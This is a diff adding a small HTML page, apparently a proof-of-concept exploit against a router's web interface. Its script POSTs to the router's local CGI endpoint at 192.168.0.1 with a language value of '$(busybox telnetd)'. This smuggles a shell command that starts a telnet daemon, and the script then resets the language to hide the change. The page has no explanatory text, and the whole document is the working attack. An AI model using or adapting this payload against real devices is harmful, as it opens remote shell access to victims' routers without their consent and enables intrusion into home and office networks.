@@ -1,0 +1,24 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+function inject(lang){
+	var xhr = new XMLHttpRequest(); 
+	var url = "http://192.168.0.1/cgi-bin/qcmap_web_cgi";
+	xhr.open("POST", url, true);
+	xhr.send(JSON.stringify({"module":"webServer","action":1,"language":lang}));
+}
+
+inject("$(busybox telnetd)");
+sleep(500).then(() => {
+    inject("en");
+});
+
+
+</script>
+</body>
